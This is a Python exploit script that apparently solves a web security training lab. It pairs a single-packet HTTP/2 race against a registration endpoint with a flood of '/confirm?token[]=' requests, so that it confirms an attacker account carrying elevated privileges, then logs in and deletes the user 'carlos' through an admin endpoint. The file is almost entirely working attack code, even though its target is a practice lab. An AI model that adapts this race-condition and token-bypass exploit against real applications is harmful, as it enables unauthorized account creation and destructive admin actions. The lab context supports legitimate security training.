import requests
import re
import sys
import shlex
import subprocess
import pickle


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.username = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_up_admin_account(self):
        self.session.get(self.lab_url)
        hostname = self.lab_url.split('https://')[1].strip('/')
        cookie_header = 'Cookie: phpsessionid={}'.format(self.session.cookies.get('phpsessionid'))
        csrf = self.get_csrf_token('register')

        # https://github.com/ma4747gh/H2SinglePacketAttacker
        for i in range(20):
            command = ('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py '
                       '{} 443 --tls_channel --streams 101 --pickle output{} '
                       '--multiple_endpoint_mode --method POST --path /register '
                       '--data \'csrf={}&username=hacker{}&email=hacker{}@ginandjuice.shop&password=Password123@\' '
                       '--header \'{}\' --header \'break\'').format(hostname, str(i), csrf, str(i), str(i), cookie_header)
            for _ in range(100):
                command += ' --method POST --path \'/confirm?token[]=\' --header \'{}\' --header \'break\''.format(cookie_header)

            args = shlex.split(command)
            print(subprocess.run(args).stdout)

        username = None
        for i in range(20):
            if username:
                break
            try:
                with open('output{}.pkl'.format(str(i)), 'rb') as file:
                    data = pickle.load(file)
                    for stream_id, stream_value in data.items():
                        if ':status 200' in stream_value['headers'] and 'content-length: 2532' not in stream_value['headers']:
                            if 'Account registration for user' in stream_value['data'].decode():
                                username = re.search(r'Account registration for user (.*) is successful!', stream_value['data'].decode()).group(1)
                                print(username)
                                break
            except Exception:
                continue

        if not username:
            return

        self.username = username

        self.sign_in_as_admin_and_delete_carlos()

    def sign_in_as_admin_and_delete_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': self.username,
            'password': 'Password123@'
        }
        self.session.post(self.lab_url + 'login', data=data)

        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_up_admin_account()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
